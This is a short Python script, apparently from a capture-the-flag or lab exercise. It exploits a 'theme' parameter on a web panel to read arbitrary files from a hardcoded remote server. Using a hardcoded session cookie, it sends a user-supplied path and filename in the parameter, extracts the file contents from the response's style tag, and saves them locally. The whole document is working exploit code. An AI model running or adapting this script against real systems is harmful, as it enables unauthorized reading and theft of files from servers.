import requests
import sys

path = sys.argv[1]
filename = sys.argv[2]
url = 'http://165.22.236.225:8006/panel'
#url = 'http://localhost:8006/panel'
cookie = {'JSESSIONID' : 'F913B6FA9396F74B575D87E4CCE3155F'}
param = {'theme' : path + filename}

r = requests.post(url, cookies=cookie, data=param)
txt = r.text

binary = txt[txt.find('<style>') + 7: txt.find('</style>')]

with open(filename, 'w') as f:
    f.write(binary.decode('string_escape'))

